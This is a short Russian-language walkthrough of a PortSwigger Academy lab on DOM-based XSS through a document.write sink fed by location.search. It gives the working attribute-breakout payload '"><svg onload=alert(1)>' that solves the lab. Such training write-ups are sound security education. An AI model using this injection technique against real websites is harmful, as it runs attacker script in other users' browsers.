перейдем на уязвимый ресурс и выполним поисковый запрос 
`qwe123`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/3.%20DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search/pics%20for%20walktrough/1.png)
Найдем запрос в хттп хистори
```
GET /?search=qwe123
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/3.%20DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search/pics%20for%20walktrough/2.png)
и увидим, следующую конструкцию для поискового запроса в ответе
```
<img src="/resources/images/tracker.gif?searchTerms='+query+'">
```
Попробуем выйти из нее, сконфигурировав поисковый запрос как

`"><svg onload=alert(1)>`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/3.%20DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search/pics%20for%20walktrough/4.png)
в результате чего, увидим что пэйлоад отработал и получим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/3.%20DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search/pics%20for%20walktrough/3.png)
